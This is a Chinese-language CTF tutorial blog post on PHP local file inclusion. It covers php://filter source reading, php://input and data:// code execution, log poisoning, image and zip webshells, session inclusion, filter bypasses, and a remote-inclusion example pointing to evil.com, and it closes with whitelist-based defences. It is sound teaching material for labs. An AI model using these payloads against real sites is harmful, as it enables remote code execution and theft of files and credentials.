---
title: 文件包含基础：include、伪协议与 LFI 利用链
date: 2026-10-30 08:30:00
updated: 2026-10-30 08:30:00
categories:
  - CTF
  - Web
  - 文件包含
tags:
  - 文件包含
  - LFI
  - php://filter
  - 伪协议
  - 入门基础
description: 文件包含题的通用知识：include 和 require 的区别、怎么判断 LFI、php://filter 读源码、常见伪协议、日志包含/图片马/zip 包含等利用链，附流程速查和防护建议。
difficulty: 入门
topic: 文件包含
series: 文件包含
series_order: 0
permalink: 2026/10/30/web-knowledge-file-inclusion-basics/
---

{% note primary %}
**一分钟速览**

- **难度**：入门
- **考点**：本地文件包含（LFI）、`php://filter`、伪协议、日志包含、图片马
- **一句话原理**：`include($_GET['file'])` 把用户输入当文件名，用户就能让 PHP 去读/执行任意文件
- **最常用的 payload**：`?file=php://filter/convert.base64-encode/resource=flag.php`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：PHP 基础、HTTP GET 参数、知道 `include` 是干什么的
- **工具**：浏览器、Burp Suite / `curl`、CyberChef
- **配套实战**：[极客大挑战 2019] Secret File 的完整 writeup 在[这里](/2026/10/30/web-ctf-file-inclusion-secret-file/)
- 本文所有测试仅用于**授权靶场和本地环境**。
{% endnote %}

{% note default %}
**做题路线**

`找参数` → `判断是否包含` → `试目录穿越` → `读源码（php://filter）` → `找可利用文件` → `日志/图片马/zip 包含` → `拿 flag`
{% endnote %}

## 文件包含漏洞是什么

PHP 有几个“把文件当代码执行”的函数：

```php
include('header.php');
require('config.php');
include_once('functions.php');
require_once('functions.php');
```

`include` 和 `require` 的区别只有一个：**文件不存在时**，`include` 发 warning 继续执行，`require` 直接 fatal error 停止。做题时都可能遇到。

漏洞出在**文件名来自用户输入**：

```php
$file = $_GET['page'];
include($file);
```

正常访问 `?page=about.php` 会包含 `about.php`；但如果用户传：

```text
?page=../../../../etc/passwd
```

`include` 就会去读 `/etc/passwd`。如果服务器还允许远程包含，甚至可以：

```text
?page=http://evil.com/shell.txt
```

这就是**文件包含漏洞**。按包含的文件位置，分为：

| 类型 | 英文 | 说明 |
| --- | --- | --- |
| 本地文件包含 | LFI（Local File Inclusion） | 包含服务器本地的文件 |
| 远程文件包含 | RFI（Remote File Inclusion） | 包含远程 URL 上的文件，需要 `allow_url_include=On` |

CTF 里绝大多数是 **LFI**，因为 RFI 默认关闭。

## 怎么判断有没有文件包含

先找“像文件名”的参数：

```text
?page=
?file=
?path=
?template=
?include=
?require=
?view=
?module=
```

然后做几个测试：

| 测试 | 预期 | 说明 |
| --- | --- | --- |
| `?page=about.php` | 正常 | 确认参数确实当文件名用 |
| `?page=about` | 可能正常 | 后端可能自动补 `.php` |
| `?page=../../../../etc/passwd` | 回显 passwd | 目录穿越成功 |
| `?page=php://filter/convert.base64-encode/resource=index.php` | 回显 base64 | 伪协议可用 |
| `?page=/etc/passwd` | 可能回显 | 绝对路径 |

{% note warning %}
不要只凭“报错”判断。很多题 `error_reporting(0)`，包含失败也不报错。真正的判断标准是：**页面内容有没有变化**。可以先用一个肯定存在的文件（如 `index.php`）做对照。
{% endnote %}

## 读源码，而不是执行

这是新手最容易混淆的点：

- `include('flag.php')` 是**执行** `flag.php`；
- 如果 `flag.php` 里只有 `$flag = '...'`，没有 `echo`，你什么都看不到；
- 想要看源码，就要用 `php://filter` 在读取时先编码，让 `include` 拿到的是文本而不是 PHP 代码。

```text
?file=php://filter/convert.base64-encode/resource=flag.php
```

流程：

```text
include 打开 php://filter 流
        ↓
读取 flag.php 的原始字节
        ↓
convert.base64-encode 编码
        ↓
include 拿到 base64 文本（没有 <?php）
        ↓
直接输出，不执行
```

拿到 base64 后，用 CyberChef 的 `From Base64` 或 `base64 -d` 解码，就能看到源码。

{% note success %}
**一句话记**：`include` 会执行，`php://filter` 让它“只读不执行”。读源码找 flag、找数据库密码、找 include 链，都靠它。
{% endnote %}

## 常见伪协议速查

PHP 的流包装器（wrapper）很多，CTF 常考这些：

| 伪协议 | 用途 | 前提/说明 |
| --- | --- | --- |
| `file://` | 读本地文件 | `file:///etc/passwd` |
| `php://filter` | 读源码、编码/解码 | 最常用，不需要特殊配置 |
| `php://input` | 读 POST 原始数据 | 需要 `allow_url_include=On` |
| `data://` | 直接把数据当文件 | 需要 `allow_url_include=On` |
| `zip://` | 读 zip 内的文件 | 需要上传 zip，`zip://path#file` |
| `phar://` | 读 phar 包，可触发反序列化 | 需要上传 phar 文件 |
| `http://` / `https://` | 远程包含 | 需要 `allow_url_include=On` |
| `ftp://` | 远程包含 | 需要 `allow_url_include=On` |

查看配置：

```php
phpinfo();  // 搜索 allow_url_include、allow_url_fopen、open_basedir
```

或者在命令行：

```bash
php -i | grep allow_url_include
```

{% note warning %}
不同 PHP 版本对伪协议的限制不同。比如 `data://` 在较新版本默认需要 `allow_url_include=On`；`phar://` 在 PHP 8 之后对反序列化的限制也更多。做题时以目标环境的 `phpinfo` 为准。
{% endnote %}

## 常见利用链

### 1. 读源码找 flag / 配置

```text
?file=php://filter/convert.base64-encode/resource=flag.php
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=index.php
```

先读入口文件，看它 `include` 了哪些文件；再顺着读 `config.php`、`flag.php`。这是最稳、最常见的路线。

### 2. `php://input` 执行 POST 代码

如果 `allow_url_include=On`：

```http
GET /?file=php://input HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

<?php system('cat /flag'); ?>
```

`php://input` 把 POST body 当成文件内容，`include` 会执行里面的 PHP。

### 3. `data://` 执行代码

```text
?file=data://text/plain,<?php system('id'); ?>
```

或者 base64 形式：

```text
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

同样需要 `allow_url_include=On`。

### 4. 日志包含

Web 服务器会把访问日志写到文件里，比如 Apache 的 `access.log`。如果日志路径可读，可以把 PHP 代码写进 `User-Agent`，再包含日志：

```http
GET /?file=../../../../var/log/apache2/access.log HTTP/1.1
User-Agent: <?php system('id'); ?>
```

日志里会出现这段 User-Agent，`include` 日志文件时就会执行。日志路径因环境而异：

```text
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

### 5. 图片马 + 文件包含

先上传一个“看起来是图片、里面带 PHP 代码”的文件：

```text
GIF89a<?php system('id'); ?>
```

服务器只检查文件头/后缀，允许上传；然后用文件包含去执行它：

```text
?file=../../uploads/avatar.jpg
```

`include` 不关心后缀，只关心内容里有没有 `<?php`。

### 6. `zip://` / `phar://`

上传一个 zip：

```text
shell.zip
└── shell.php   ← <?php system('id'); ?>
```

然后：

```text
?file=zip://../../uploads/shell.zip#shell.php
```

`phar://` 类似，而且可能触发反序列化：

```text
?file=phar://../../uploads/evil.phar/test
```

### 7. Session 文件包含

PHP 的 session 默认存在 `/tmp/sess_<PHPSESSID>`。如果能把 PHP 代码写进 session（比如用户名、留言），再包含 session 文件：

```text
?file=../../../../tmp/sess_<你的 PHPSESSID>
```

这条链需要能控制 session 内容，且知道 session 路径。

## 绕过技巧速查

| 场景 | 绕过 | 说明 |
| --- | --- | --- |
| 过滤 `../` | `....//`、`..././` | 删一次 `../` 后剩下 `../` |
| 过滤 `../` | URL 编码 `%2e%2e%2f` | 服务端解码后还原 |
| 过滤 `../` | 绝对路径 `/etc/passwd` | 有时直接可用 |
| 过滤关键字 | 大小写、双写、编码 | 看过滤实现 |
| 自动补后缀 | `%00` 截断（PHP < 5.3.4） | 老版本可用 |
| 自动补后缀 | `?` 截断（部分环境） | `shell.php?` |
| 只允许特定目录 | `php://filter` 读源码 | 不一定要穿越 |
| RFI 关闭 | 日志/图片马/zip | 从本地文件入手 |

{% note warning %}
`%00` 截断在新版本 PHP 已经修复，不要默认它一定可用。做题时先 `phpinfo` 看版本，或者直接试别的链。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 找参数 | 看 URL、表单、源码里的 `include` |
| 2 | 确认包含 | `?page=index.php` 看是否变化 |
| 3 | 试穿越 | `../../../../etc/passwd` |
| 4 | 读源码 | `php://filter/convert.base64-encode/resource=index.php` |
| 5 | 找 flag/配置 | 读 `flag.php`、`config.php`、`db.php` |
| 6 | 找写入点 | 上传、日志、session、缓存 |
| 7 | 执行代码 | 图片马、日志包含、`php://input`、`data://` |
| 8 | 拿 flag | `system('cat /flag')` 或读源码 |

## 新手常见问题

{% note info **Q1：`include` 和 `require` 有什么区别？** %}
文件不存在时，`include` 发 warning 继续，`require` 直接 fatal 停止。做题时 `include` 更常见，因为页面不会直接崩。
{% endnote %}

{% note info **Q2：为什么 `?file=flag.php` 看不到 flag？** %}
`include` 是执行，不是显示。`flag.php` 只赋值不 `echo`，所以页面上没有 flag。用 `php://filter` 读源码。
{% endnote %}

{% note info **Q3：`php://filter` 为什么能读源码？** %}
它在读取文件时先做 base64 编码，`include` 拿到的是纯文本，没有 `<?php`，所以不会执行，直接输出。
{% endnote %}

{% note info **Q4：`allow_url_include` 和 `allow_url_fopen` 有什么区别？** %}
`allow_url_fopen` 控制 `file_get_contents`、`fopen` 等能不能打开 URL；`allow_url_include` 控制 `include`/`require` 能不能包含 URL。RFI 需要后者为 `On`。
{% endnote %}

{% note info **Q5：日志包含找不到日志路径？** %}
常见路径：`/var/log/apache2/access.log`、`/var/log/httpd/access_log`、`/var/log/nginx/access.log`。也可以读 `/proc/self/environ`、`/proc/self/cmdline` 找线索。路径因环境而异，先读 `/etc/passwd` 确认能穿越。
{% endnote %}

{% note info **Q6：图片马为什么能执行？** %}
`include` 只看内容里有没有 `<?php`，不看后缀。图片头 `GIF89a` 只是让上传检查通过，后面的 PHP 代码才是真正执行的部分。
{% endnote %}

{% note info **Q7：`zip://` 的 `#` 是什么？** %}
`#` 后面是 zip 内的文件名。URL 里 `#` 会被浏览器当锚点，所以要编码成 `%23`，或者用 Burp 发包。
{% endnote %}

{% note info **Q8：为什么 `php://input` 没反应？** %}
需要 `allow_url_include=On`，且请求方法/Content-Type 要对。用 POST 发 PHP 代码，不要用 GET。
{% endnote %}

{% note info **Q9：`php://filter` 被过滤了怎么办？** %}
试大小写、双写、`php://filter/read=...`、`convert.base64-encode` 的其他写法；也可以换 `data://`、日志包含、图片马。过滤器很多，黑名单很难列全。
{% endnote %}

{% note info **Q10：文件包含和文件上传怎么配合？** %}
上传一个带 PHP 代码的图片/压缩包，再用文件包含去执行它。上传负责“把文件放上去”，包含负责“让文件跑起来”。
{% endnote %}

## 顺手聊聊怎么防

文件包含的根因是**把用户输入当文件名**。防护思路：

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **白名单映射** | `?page=about` → 固定文件，不用用户拼路径 |
| ★★★ | **不要把敏感文件放在 Web 目录** | flag、配置、备份文件移出去 |
| ★★★ | **`open_basedir` 限制目录** | 即使包含也只能读指定目录 |
| ★★☆ | **关闭远程包含** | `allow_url_include=Off`、`allow_url_fopen=Off` |
| ★★☆ | **`realpath` + 前缀检查** | 解析真实路径，确认在允许目录内 |
| ★★☆ | **禁用危险函数** | `disable_functions` 关掉 `system`、`exec` 等 |
| ★☆☆ | **日志/上传目录不可执行** | 降低图片马、日志包含的危害 |
| ★☆☆ | **WAF / 黑名单** | 只能提高门槛，不能作为唯一防线 |

白名单写法：

```php
$pages = [
    'about'   => __DIR__ . '/pages/about.php',
    'contact' => __DIR__ . '/pages/contact.php',
];

$key = $_GET['page'] ?? 'about';
if (!isset($pages[$key])) {
    exit('not found');
}
include $pages[$key];
```

{% note success %}
**一条原则**：文件名可以是用户选的“键”，但永远不该是用户拼的“路径”。白名单 + 敏感文件移出 Web 目录 + 关闭远程包含，三件事做到，文件包含就很难成立。
{% endnote %}
